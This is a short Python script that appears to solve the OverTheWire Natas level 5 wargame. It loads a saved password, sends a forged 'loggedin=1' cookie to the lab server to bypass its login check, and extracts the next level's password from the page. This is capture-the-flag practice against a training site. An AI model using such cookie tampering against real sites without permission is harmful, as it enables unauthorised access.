import requests
import re

userName = 'natas5'
fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt') 
password = fileContent.readlines()[4][8:40] 
print(f"The password of natas5 is {password}\n")

url = f'http://{userName}.natas.labs.overthewire.org'

cookies = {
    'loggedin': '1'
}

response = requests.get(url, auth = (userName, password), cookies = cookies)
htmlDoc = response.text

# it will allow us to see the headers 
print(response.headers) 

print("\n")

print(re.findall("password (.*)", htmlDoc))
# print(htmlDoc)

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("Operation Success!")
except IOError as e:
    print(f'Unexpected though: {e}')